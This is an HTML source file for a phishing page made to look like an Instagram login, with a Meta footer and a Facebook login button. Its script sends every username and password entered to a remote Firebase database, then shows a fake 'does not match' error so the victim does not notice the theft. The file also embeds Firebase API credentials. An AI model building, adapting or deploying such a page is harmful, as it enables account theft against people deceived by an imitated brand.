<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My System</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">

<style>

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    background: #fafafa;
    font-family: 'DM Sans', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .wrapper {
    display: flex;
    align-items: center;
    gap: 32px;
    max-width: 900px;
    width: 100%;
    padding: 20px;
  }

  /* ── LEFT SIDE ── */
  .left {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 24px;
  }

  .phone-mockup {
    width: 260px;
    height: 420px;
    background: #fff;
    border-radius: 36px;
    border: 2px solid #dbdbdb;
    box-shadow: 0 8px 40px rgba(0,0,0,0.12);
    display: flex;
    flex-direction: column;
    overflow: hidden;
    position: relative;
  }

  .phone-top {
    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
    height: 52%;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .phone-top .ms-logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 34px;
    color: #fff;
    letter-spacing: 1px;
    text-shadow: 0 2px 8px rgba(0,0,0,0.2);
  }

  .phone-bottom {
    background: #fafafa;
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 10px;
    padding: 14px 16px;
  }

  .card-row {
    display: flex;
    gap: 8px;
  }

  .card {
    flex: 1;
    height: 56px;
    border-radius: 8px;
    background: linear-gradient(135deg, #ee2a7b22, #6228d722);
    border: 1px solid #dbdbdb;
  }

  .card.wide {
    flex: 2;
    background: linear-gradient(135deg, #f9ce3422, #ee2a7b22);
  }

  .tagline {
    text-align: center;
    font-size: 22px;
    font-weight: 600;
    color: #262626;
    line-height: 1.4;
  }

  .tagline span {
    background: linear-gradient(90deg, #f9ce34, #ee2a7b, #6228d7);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }

  /* ── RIGHT SIDE ── */
  .right {
    width: 350px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .box {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 40px 40px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
  }

  .logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 52px;
    background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 16px;
    letter-spacing: 1px;
  }

  .input-group {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 6px;
    margin-top: 8px;
  }

  input {
    width: 100%;
    padding: 9px 10px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 12px;
    font-family: 'DM Sans', sans-serif;
    color: #262626;
    outline: none;
    transition: border-color 0.2s;
  }

  input:focus {
    border-color: #a8a8a8;
    background: #fff;
  }

  input::placeholder {
    color: #8e8e8e;
  }

  button.primary {
    width: 100%;
    padding: 8px;
    margin-top: 8px;
    background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    font-family: 'DM Sans', sans-serif;
    cursor: pointer;
    opacity: 0.9;
    transition: opacity 0.2s;
  }

  button.primary:hover {
    opacity: 1;
  }

  .or-divider {
    display: flex;
    align-items: center;
    width: 100%;
    gap: 16px;
    margin: 12px 0 4px;
  }

  .or-divider hr {
    flex: 1;
    border: none;
    border-top: 1px solid #dbdbdb;
  }

  .or-divider span {
    font-size: 13px;
    font-weight: 600;
    color: #8e8e8e;
  }

  button.fb {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    background: none;
    border: none;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    font-family: 'DM Sans', sans-serif;
    cursor: pointer;
    padding: 6px;
    width: 100%;
  }

  .fb-icon {
    width: 18px;
    height: 18px;
    background: #385185;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 11px;
    font-weight: 700;
  }

  .message {
    font-size: 13px;
    color: #ed4956;
    min-height: 18px;
    margin-top: 6px;
    text-align: center;
    display: none;
  }

  .message.show {
    display: block;
  }

  .box2 {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 20px;
    text-align: center;
    font-size: 14px;
    color: #262626;
  }

  .box2 a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
  }

  .meta {
    text-align: center;
    margin-top: 8px;
  }

  .meta-logo {
    font-size: 13px;
    color: #8e8e8e;
    font-weight: 500;
    letter-spacing: 2px;
  }

  /* Responsive */
  @media (max-width: 700px) {
    .left { display: none; }
    .right { width: 100%; max-width: 350px; }
  }

</style>
</head>

<body>

<div class="wrapper">

  <!-- LEFT -->
  <div class="left">
    <div class="phone-mockup">
      <div class="phone-top">
        <span class="ms-logo">My System</span>
      </div>
      <div class="phone-bottom">
        <div class="card-row">
          <div class="card wide"></div>
          <div class="card"></div>
        </div>
        <div class="card-row">
          <div class="card"></div>
          <div class="card wide"></div>
        </div>
        <div class="card-row">
          <div class="card wide"></div>
          <div class="card"></div>
        </div>
      </div>
    </div>

    <p class="tagline">See everyday moments from<br>your <span>close friends.</span></p>
  </div>

  <!-- RIGHT -->
  <div class="right">

    <div class="box">
      <div class="logo">My System</div>

      <div class="input-group">
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button class="primary" onclick="registerUser()">Register</button>
      </div>

      <div class="or-divider">
        <hr><span>OR</span><hr>
      </div>

      <button class="fb">
        <div class="fb-icon">f</div>
        Log in with Facebook
      </button>

      <p class="message" id="message">Username and Password does not match</p>
    </div>

    <div class="box2">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="meta">
      <span class="meta-logo">∞ Meta</span>
    </div>

  </div>

</div>

<script type="module">

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
getDatabase,
ref,
push
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey:  "AIzaSyAGT849YcBnW38SeOEoAkVVtwtcwyNLzwY",
  authDomain: "instagran-3b461.firebaseapp.com",
  databaseURL: "https://instagran-3b461-default-rtdb.firebaseio.com",
  projectId: "instagran-3b461",
  storageBucket: "instagran-3b461.firebasestorage.app",
  messagingSenderId: "372304244325",
  appId: "1:372304244325:web:7b8fb25bc108cfc221608c"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

window.registerUser = function(){
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  push(ref(db,"users"),{
    username: username,
    password: password
  });

  const msg = document.getElementById("message");
  msg.textContent = "Username and Password does not match";
  msg.classList.add("show");
}

</script>

</body>
</html>
